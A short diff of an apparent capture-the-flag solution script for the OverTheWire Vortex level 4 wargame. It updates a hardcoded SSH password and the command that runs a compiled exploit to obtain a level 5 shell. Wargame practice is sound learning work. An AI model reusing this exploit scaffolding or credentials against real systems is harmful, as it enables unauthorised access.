@@ -7,7 +7,7 @@ import time
 level = 4
 USER = 'vortex%s' % level
 HOST = 'vortex.labs.overthewire.org'
-PASS = '2YmgK1=jw'
+PASS = 'iKTILGFu9'
 PORT = 2228
 
 def connect_to_level():
@@ -31,7 +31,7 @@ def setup_payload(sh):
 def execute_payload(sh):
     time.sleep(0.05)
     w = log.progress("Executing vortex 4 wrapper...")
-    shell = sh.run(b'/tmp/tald4/pwn ')
+    shell = sh.run(b'/tmp/tald4/pwn')
     w.success("vortex5 shell established")
     shell.interactive()
 
